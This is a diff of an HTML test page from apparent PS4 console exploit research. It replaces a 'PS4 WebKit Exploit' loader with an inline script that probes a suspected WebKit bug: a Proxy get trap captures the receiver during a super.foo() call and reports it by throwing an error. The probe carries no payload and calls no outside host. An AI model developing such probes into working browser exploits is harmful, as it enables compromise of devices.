@@ -1,17 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>PS4 WebKit Exploit</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
-    pre#log { white-space: pre-wrap; }
-  </style>
+  <title>Proxy Super Exploit Test</title>
+  <meta charset="UTF-8">
 </head>
 <body>
-  <h1>PS4 WebKit Exploit</h1>
-  <pre id="log">[+] Loading...</pre>
+  <h1>Proxy Super Exploit Test</h1>
+  <script>
+    // Exploit test for Proxy `get` trap scope leak via super.property in WebKit (PS4)
+    var leakedReceiver;
+    const handler = {
+      get(target, prop, receiver) {
+        leakedReceiver = receiver;
+        if (prop === "foo") return function() {};
+        return target[prop];
+      }
+    };
 
-  <script src="Leak_test_exploit.js"></script>
+    const base = new Proxy({}, handler);
+
+    class Exploit extends Object {
+      foo() { return super.foo(); }
+    }
+    Object.setPrototypeOf(Exploit.prototype, base);
+
+    const obj = new Exploit();
+    obj.foo();
+
+    // Show result by throwing an error (should display on PS4 WebKit)
+    throw new Error(
+      "Leaked receiver: [" + leakedReceiver + "] " +
+      "Type: " + (leakedReceiver && leakedReceiver.constructor && leakedReceiver.constructor.name)
+    );
+  </script>
 </body>
 </html>
